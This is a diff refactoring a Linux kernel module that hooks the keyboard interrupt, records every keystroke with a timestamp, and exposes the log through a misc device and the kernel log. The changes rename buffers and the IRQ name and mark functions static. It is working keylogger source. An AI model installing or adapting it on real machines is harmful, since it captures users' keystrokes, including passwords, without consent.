@@ -3,16 +3,19 @@
 unsigned char *kbus[] = {US_KBMAP};
 unsigned int stats[97] = {0};
 
-char *cd_file[BUFFER_SIZE];
-int cd_size = 0;
-int cd_index = 0;
+char *device_file[BUFFER_SIZE];
+int device_size = 0;
+int device_index = 0;
 
+struct miscdevice misc;
 static struct file_operations fops = {
 	.owner = THIS_MODULE,
 	.read = device_read,
 };
 
-char *strdup(char const *str) {
+/* === UTILS === */
+
+static char *strdup(char const *str) {
 	int len = strlen(str);
 	char *result = kmalloc((len + 1) * sizeof(char), GFP_KERNEL);
 	if (!result)
@@ -24,19 +27,22 @@ char *strdup(char const *str) {
 	return result;
 }
 
+/* === MISCDEVICE === */
+
 ssize_t device_read(struct file *filep, char *u_buffer, size_t len, loff_t *offset) {
-	if (*offset >= cd_size)
+	if (*offset >= device_size)
 		return 0;
-	if (*offset + len > cd_size)
-		len = cd_size - *offset;
+	if (*offset + len > device_size)
+		len = device_size - *offset;
 
 	int i = 0;
 	int j = 0;
 	int total = 0;
 	int bytes = 0;
 
-	while (i < cd_index) {
-		int len_str = strlen(cd_file[i]) + 1;
+	// reach the offset
+	while (i < device_index) {
+		int len_str = strlen(device_file[i]) + 1;
 		if (total + len_str >= *offset) {
 			j = *offset - total;
 			break;
@@ -45,9 +51,10 @@ ssize_t device_read(struct file *filep, char *u_buffer, size_t len, loff_t *offs
 		i++;
 	}
 
-	while (i < cd_index && len > 0) {
-		while (cd_file[i][j]) {
-			if (put_user(cd_file[i][j], u_buffer++))
+	// write everything in the user buffer
+	while (i < device_index && len > 0) {
+		while (device_file[i][j]) {
+			if (put_user(device_file[i][j], u_buffer++))
 				return -EFAULT;
 			j++;
 			bytes++;
@@ -69,8 +76,7 @@ ssize_t device_read(struct file *filep, char *u_buffer, size_t len, loff_t *offs
 	return bytes;
 }
 
-struct miscdevice misc;
-int register_device(void) {
+static int register_device(void) {
 	misc.minor = MISC_DYNAMIC_MINOR;
 	misc.name = DEVICE_NAME;
 	misc.fops = &fops;
@@ -83,25 +89,28 @@ int register_device(void) {
 	LOG("registered device");
 	return 0;
 }
-void unregister_device(void) {
+
+static void unregister_device(void) {
 	LOG("unregistering");
 	misc_deregister(&misc);
 }
 
-void add_to_cd(char *str) {
-	if (cd_index < BUFFER_SIZE - 1) {
-		cd_file[cd_index] = str;
-		cd_index++;
+/* === KEY HANDLER === */
+
+static void add_log_to_file(char *str) {
+	if (device_index < BUFFER_SIZE - 1) {
+		device_file[device_index] = str;
+		device_index++;
 	} else {
-		kfree(cd_file[0]);
-		for (int i = 0; i < cd_index; i++) {
-			cd_file[i] = cd_file[i + 1];
+		kfree(device_file[0]);
+		for (int i = 0; i < device_index; i++) {
+			device_file[i] = device_file[i + 1];
 		}
-		cd_file[cd_index] = str;
+		device_file[device_index] = str;
 	}
 }
 
-void add_entry(int scancode, int release, struct rtc_time *time) {
+static void add_entry(int scancode, int release, struct rtc_time *time) {
 	char entry[42];
 	int len = scnprintf(entry, 42,
 			"[%ptRt] %s (%d) %s",
@@ -110,11 +119,10 @@ void add_entry(int scancode, int release, struct rtc_time *time) {
 	if (len <= 0)
 		return ;
 	char *log = strdup(entry);
-	if (!log)
-		return ;
-
-	add_to_cd(log);
-	cd_size += len + 1;
+	if (log) {
+		add_log_to_file(log);
+		device_size += len;
+	}
 
 	LOGF("%s", entry);
 	if (!release)
@@ -133,6 +141,8 @@ static irqreturn_t irq_handler(int irq, void *dev_id) {
 	return IRQ_NONE;
 }
 
+/* === INIT/EXIT === */
+
 int __init m_init(void) {
 	LOG("trying to init");
 	int err = 0;
@@ -140,7 +150,7 @@ int __init m_init(void) {
 	err = register_device();
 	if (err)
 		return err;
-	err = request_irq(1, irq_handler, IRQF_SHARED, "dino_keyboard", (void *)irq_handler);
+	err = request_irq(1, irq_handler, IRQF_SHARED, "kb", (void *)irq_handler);
 	if (err) {
 		LOG("request_irq failed");
 		return err;
@@ -166,8 +176,8 @@ void __exit m_exit(void) {
 	LOGF("most pressed key is '%s': %d times (%d%%) !", kbus[max], stats[max], ratio);
 
 	free_irq(1, (void *)irq_handler);
-	for (int i = 0; i < cd_index; i++) {
-		kfree(cd_file[i]);
+	for (int i = 0; i < device_index; i++) {
+		kfree(device_file[i]);
 	}
 	return;
 }
